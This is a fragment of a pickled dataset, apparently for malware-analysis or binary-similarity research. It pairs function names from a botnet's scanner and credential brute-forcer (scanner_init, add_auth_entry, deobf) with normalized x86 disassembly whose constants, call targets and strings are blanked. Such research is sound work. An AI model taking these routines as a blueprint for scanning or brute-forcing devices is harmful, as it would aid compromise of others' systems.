S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~EBX,[ESP+0]\nMOV~ESI,[ESP+0]\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nLEA~ECX,[EBX+0]\nINC~EAX\nMOV~EDI,0\nADD~ESP,0\nJMP~FOO\nMOV~DL,[ESI]\nCMP~DL,0\nJZ~FOO\nTEST~DL,DL\nJNZ~FOO\nMOV~EDX,EDI\nMOV~[EBX],DL\nLEA~EDX,[ECX+0]\nMOV~EBX,ECX\nMOV~EDI,0\nJMP~FOO\nINC~EDI\nMOV~[ECX],DL\nLEA~EDX,[ECX+0]\nINC~ESI\nDEC~EAX\nMOV~ECX,EDX\nTEST~EAX,EAX\nJG~FOO\nMOV~BYTEPTR[ECX],0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p119
L82L
tp120
a(S'resolv_lookup'
p121
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EDI,[ESP+0]\nADD~EDI,EAX\nLEA~EBX,[EDI+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nADD~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~EAX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~ECX,EAX\nMOV~EAX,0\nMUL~,ECX\nSHR~EDX,0\nMOV~EAX,EDX\nSHL~EAX,0\nSUB~EAX,EDX\nMOV~ESI,ECX\nSUB~ESI,EAX\nMOV~[ESP+0],SI\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],SI\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[EDI+0],0\nMOV~[EBX+0],0\nMOV~ESI,0\nMOV~EBP,0\nADD~ESP,0\nLEA~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nCMP~ESI,0\nJZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ESI,EAX\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nLEA~EAX,[ESP+0]\nSUB~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~0\nPUSH~[ESP+0]\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~ESI\nPUSH~0\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~ESI\nPUSH~0\nCALL~FOO\nMOV~EAX,0\nMOV~ECX,0\nMOV~EDI,[ESP+0]\nCLD\nSTOSD~,\nMOV~EDI,ESI\nSHR~EDI,0\nMOV~EBX,ESI\nAND~EBX,0\nBTS~[ESP+EDI*4+0],EBX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nBT~[ESP+EDI*4+0],EBX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~EAX,0\nADD~ESP,0\nCMP~EBX,EAX\nJB~FOO\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nLEA~EBX,[EDX+EAX+0]\nADD~ESP,0\nMOV~ECX,[ESP+0]\nCMP~CX,[ESP+0]\nJNZ~FOO\nMOV~AX,[ESP+0]\nTEST~AX,AX\nJZ~FOO\nROR~AX,0\nMOV~[ESP+0],AX\nJMP~FOO\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~ECX,[ESP+0]\nMOV~EDX,EAX\nMOV~EAX,EBX\nCALL~FOO\nMOV~EDI,EBX\nADD~EDI,[ESP+0]\nLEA~EBP,[EDI+0]\nCMP~WORDPTR[EDI],0\nJNZ~FOO\nCMP~[EDI+0],0\nJNZ~FOO\nMOV~AX,[EDI+0]\nROR~AX,0\nCMP~AX,0\nJNZ~FOO\nMOV~AL,[EDI+0]\nMOV~[ESP+0],AL\nMOV~AL,[EBP+0]\nMOV~[ESP+0],AL\nMOV~AL,[EBP+0]\nMOV~[ESP+0],AL\nMOV~AL,[EBP+0]\nMOV~[ESP+0],AL\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~EAX,0\nMOV~AL,[EDX]\nLEA~EAX,<STR>\nPUSH~EAX\nPUSH~[EDX+0]\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~[ECX+0],EAX\nMOV~DL,[ECX]\nMOV~EBX,0\nMOV~BL,DL\nMOV~ECX,[ESP+0]\nMOV~[EAX+EBX*4],ECX\nINC~EDX\nMOV~EAX,[ESP+0]\nMOV~[EAX],DL\nADD~ESP,0\nMOV~AX,[EDI+0]\nROR~AX,0\nAND~EAX,0\nLEA~EBX,[EBP+EAX+0]\nJMP~FOO\nLEA~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~EAX,EBP\nCALL~FOO\nMOV~EBX,EBP\nADD~EBX,[ESP+0]\nDEC~[ESP+0]\nCMP~[ESP+0],0\nJNZ~FOO\nJMP~FOO\nCMP~EBP,0\nJZ~FOO\nINC~EBP\nJMP~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,[ESP+0]\nCMP~BYTEPTR[EDX],0\nJNZ~FOO\nSUB~ESP,0\nPUSH~EDX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nMOV~EAX,[ESP+0]\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p122
L1030L
tp123
a(S'consume_any_prompt'
p124
S'"MOV~ECX,EAX\nMOV~EAX,[EAX+0]\nDEC~EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EAX+ECX+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nJMP~FOO\nMOV~DL,[EAX+ECX+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nINC~EAX\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nDEC~EAX\nJNZ~FOO\nMOV~EAX,0\nRETN"'
p125
L87L
tp126
a(S'can_consume'
p127
S'"PUSH~EBX\nLEA~EBX,[EAX+0]\nADD~EBX,[EAX+0]\nADD~ECX,EDX\nCMP~EBX,ECX\nSETNBE~AL\nAND~EAX,0\nPOP~EBX\nRETN"'
p128
L21L
tp129
a(S'scanner_kill'
p130
S'"SUB~ESP,0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nRETN"'
p131
L20L
tp132
a(S'deobf'
p133
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EDI,EDX\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nMOV~[EDI],EAX\nINC~EAX\nMOV~[ESP],EAX\nCALL~FOO\nMOV~ESI,EAX\nADD~ESP,0\nMOV~EAX,[EDI]\nINC~EAX\nPUSH~EAX\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~DWORDPTR[EDI],0\nJLE~FOO\nMOV~ECX,0\nMOV~EDX,[EDI]\nMOV~EAX,ECX\nXOR~[ECX+ESI-0],0\nINC~ECX\nCMP~EAX,EDX\nJL~FOO\nMOV~EAX,ESI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p134
L76L
tp135
a(S'add_auth_entry'
p136
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,EAX\nMOV~EDI,EDX\nMOV~[ESP+0],CX\nMOV~EAX,<STR>\nSHL~EAX,0\nADD~EAX,0\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nMOV~EDX,EAX\nMOV~<STR>,EAX\nMOV~EAX,<STR>\nSHL~EAX,0\nLEA~EBP,[EDX+EAX]\nLEA~ESI,[ESP+0]\nMOV~EDX,ESI\nMOV~EAX,EBX\nCALL~FOO\nMOV~[EBP+0],EAX\nMOV~EAX,<STR>\nSHL~EAX,0\nMOV~ECX,[ESP+0]\nMOV~EDX,<STR>\nMOV~[EAX+EDX+0],CL\nMOV~EBX,<STR>\nSHL~EBX,0\nADD~EBX,<STR>\nMOV~EDX,ESI\nMOV~EAX,EDI\nCALL~FOO\nMOV~[EBX+0],EAX\nMOV~EAX,<STR>\nSHL~EAX,0\nMOV~ECX,[ESP+0]\nMOV~EDX,<STR>\nMOV~[EAX+EDX+0],CL\nMOV~EAX,<STR>\nSHL~EAX,0\nMOV~CX,<STR>\nMOV~EDX,<STR>\nMOV~[EAX+EDX+0],CX\nMOV~EDX,<STR>\nMOV~EBX,EDX\nSHL~EBX,0\nMOV~CX,<STR>\nADD~CX,[ESP+0]\nMOV~EAX,<STR>\nMOV~[EBX+EAX+0],CX\nINC~EDX\nMOV~<STR>,EDX\nMOV~AX,[ESP+0]\nADD~<STR>,AX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p137
L230L
tp138
a(S'setup_connection'
p139
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,EAX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~EAX,[EAX+0]\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[EBX+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[EBX+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[ESP+0],0\nMOV~EAX,[EBX+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[EBX+0]\nMOV~[ESP+0],AX\nMOV~EAX,<STR>\nMOV~[EBX+0],EAX\nMOV~[EBX+0],0\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nRETN"'
p140
L202L
tp141
a(S'recv_strip_null'
p142
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nMOV~EDX,0\nCMP~BYTEPTR[EDX+EBX],0\nJNZ~FOO\nMOV~BYTEPTR[EDX+EBX],0\nINC~EDX\nCMP~EAX,EDX\nJNZ~FOO\nADD~ESP,0\nPOP~EBX\nRETN"'
p143
L58L
tp144
a(S'scanner_init'
p145
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nCALL~FOO\nMOV~<STR>,EAX\nTEST~EAX,EAX\nJG~FOO\nCMP~EAX,0\nJZ~FOO\nCALL~FOO\nMOV~<STR>,EAX\nCALL~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nMOV~[ESP+0],0\nMOV~EAX,0\nADD~ESP,0\nLEA~EAX,[EAX+EAX*8]\nSHL~EAX,0\nMOV~EDX,<STR>\nMOV~[EAX+EDX+0],0\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*8]\nSHL~EAX,0\nMOV~EDX,<STR>\nMOV~[EAX+EDX+0],0\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~EAX,0\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nMOV~[ESP+0],0\nMOV~DWORDPTR[ESP],0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~<STR>\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP+0],AX\nROR~AX,0\nCMP~AX,0\nJBE~FOO\nMOV~<STR>,0\nMOV~<STR>,0\nCALL~FOO\nMOV~<STR>,AX\nMOV~<STR>,0\nMOV~<STR>,0\nMOV~<STR>,0\nMOV~<STR>,BX\nMOV~AL,<STR>\nAND~EAX,0\nOR~EAX,0\nMOV~<STR>,AL\nCALL~FOO\nMOV~<STR>,AX\nOR~<STR>,0\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,EDX\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ESI,<STR>\nCMP~[ESP+0],ESI\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nCALL~FOO\nMOV~<STR>,AX\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nCALL~FOO\nMOV~CL,AL\nMOV~EBX,EAX\nSHR~EBX,0\nMOV~EDX,EAX\nSHR~EDX,0\nMOV~EDI,EAX\nSHR~EDI,0\nCMP~AL,0\nJZ~FOO\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nLEA~EAX,[EAX-0]\nCMP~AL,0\nJBE~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJZ~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJBE~FOO\nCMP~BL,0\nJBE~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJBE~FOO\nCMP~BL,0\nJBE~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJZ~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJBE~FOO\nCMP~BL,0\nJBE~FOO\nCMP~CL,0\nJA~FOO\nLEA~EAX,[ECX-0]\nCMP~AL,0\nJBE~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nAND~EDX,0\nSHL~EDX,0\nSHL~ECX,0\nMOV~EAX,0\nMOV~AL,BL\nSHL~EAX,0\nOR~ECX,EAX\nMOV~EAX,EDI\nAND~EAX,0\nOR~ECX,EAX\nOR~EDX,ECX\nROR~DX,0\nROR~EDX,0\nROR~DX,0\nMOV~<STR>,EDX\nMOV~<STR>,0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~<STR>,AX\nMOV~EDX,[ESP+0]\nMOV~EAX,0\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nIDIV~,ECX\nADD~ESP,0\nTEST~EDX,EDX\nJNZ~FOO\nMOV~<STR>,0\nJMP~FOO\nMOV~<STR>,0\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nMOV~<STR>,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~<STR>,AX\nMOV~[ESP+0],0\nMOV~EAX,<STR>\nMOV~[ESP+0],EAX\nMOV~AX,<STR>\nMOV~[ESP+0],AX\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nMOV~[ESP+0],ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EDI,0\nLEA~EBP,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[EAX],0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~EBP\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nMOV~EDX,[ESP+0]\nCMP~DWORDPTR[EDX],0\nJZ~FOO\nCMP~EAX,0\nJBE~FOO\nMOV~EDX,EBP\nMOV~EAX,[ESP+0]\nCMP~EAX,<STR>\nJNZ~FOO\nCMP~[ESP+0],0\nJNZ~FOO\nLEA~EBX,[ESP+0]\nMOV~EAX,[ESP+0]\nCMP~AX,0\nJZ~FOO\nCMP~AX,0\nJNZ~FOO\nMOV~CX,[ESP+0]\nCMP~CX,[EBX+0]\nJNZ~FOO\nMOV~AL,[EBX+0]\nTEST~AL,0\nJZ~FOO\nTEST~AL,0\nJZ~FOO\nTEST~AL,0\nJNZ~FOO\nTEST~AL,0\nJNZ~FOO\nMOV~EAX,[EBX+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nDEC~EAX\nMOV~ESI,EAX\nROR~SI,0\nROR~ESI,0\nROR~SI,0\nCMP~[EDX+0],ESI\nJNZ~FOO\nCMP~EDI,0\nJG~FOO\nLEA~EAX,[EDI+EDI*8]\nSHL~EAX,0\nMOV~EDX,EAX\nADD~EDX,<STR>\nCMP~[EDX+0],0\nJZ~FOO\nLEA~ECX,[EDX+0]\nMOV~EAX,EDI\nJMP~FOO\nMOV~EDX,ECX\nLEA~ECX,[ECX+0]\nCMP~[EDX+0],0\nJZ~FOO\nINC~EAX\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nMOV~EDI,EAX\nTEST~EDX,EDX\nJZ~FOO\nMOV~[EDX+0],ESI\nMOV~EAX,[EBX]\nMOV~[EDX+0],AX\nMOV~EAX,EDX\nCALL~FOO\nJMP~FOO\nMOV~EAX,0\nMOV~EDX,0\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nMOV~[ESP+0],0\nMOV~EDI,0\nMOV~ESI,0\nLEA~EAX,[EAX+EAX*8]\nSHL~EAX,0\nMOV~EBX,EAX\nADD~EBX,<STR>\nMOV~EDX,[EBX+0]\nMOV~ECX,0\nCMP~EDX,0\nJA~FOO\nTEST~EDX,EDX\nJZ~FOO\nMOV~ECX,0\nMOV~EAX,<STR>\nSUB~EAX,[EBX+0]\nCMP~EAX,ECX\nJBE~FOO\nSUB~ESP,0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nADD~ESP,0\nCMP~[EBX+0],0\nJBE~FOO\nMOV~AL,[EBX+0]\nINC~EAX\nMOV~[EBX+0],AL\nCMP~AL,0\nJNZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nJMP~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nJMP~FOO\nCMP~EDX,0\nJNZ~FOO\nMOV~EAX,[EBX+0]\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[EBX+0]\nCMP~EAX,ESI\nJLE~FOO\nMOV~ESI,EAX\nJMP~FOO\nTEST~EDX,EDX\nJZ~FOO\nMOV~EAX,[EBX+0]\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[EBX+0]\nCMP~EAX,EDI\nJLE~FOO\nMOV~EDI,EAX\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~EAX,0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EAX,EDI\nCMP~EDI,ESI\nJGE~FOO\nMOV~EAX,ESI\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nMOV~[ESP+0],0\nMOV~EAX,0\nADD~ESP,0\nLEA~EAX,[EAX+EAX*8]\nSHL~EAX,0\nMOV~EBX,EAX\nADD~EBX,<STR>\nMOV~EDX,[EBX+0]\nCMP~EDX,0\nJZ~FOO\nMOV~EAX,EDX\nAND~EAX,0\nSHR~EDX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nOR~EAX,[ESP+0]\nJNZ~FOO\nMOV~[EBX+0],0\nCALL~FOO\nMOV~DX,<STR>\nAND~EDX,0\nMOV~ECX,EDX\nMOV~EDX,0\nDIV~,ECX\nMOV~EDI,<STR>\nTEST~EDI,EDI\nJLE~FOO\nMOV~ECX,<STR>\nMOV~ESI,0\nMOV~EAX,ECX\nCMP~DX,[ECX+0]\nJB~FOO\nCMP~DX,[ECX+0]\nJB~FOO\nINC~ESI\nADD~ECX,0\nCMP~EDI,ESI\nJNZ~FOO\nMOV~EAX,0\nMOV~[EBX],EAX\nMOV~[EBX+0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~EDX,EAX\nAND~EDX,0\nSHR~EAX,0\nBT~[ESP+EAX*4+0],EDX\nSETB~DL\nTEST~DL,DL\nJZ~FOO\nCMP~[EBX+0],0\nJZ~FOO\nCMP~[EBX+0],0\nJNZ~FOO\nLEA~EDX,[EBX+0]\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[EBX+0]\nPUSH~EAX\nPUSH~EDX\nCALL~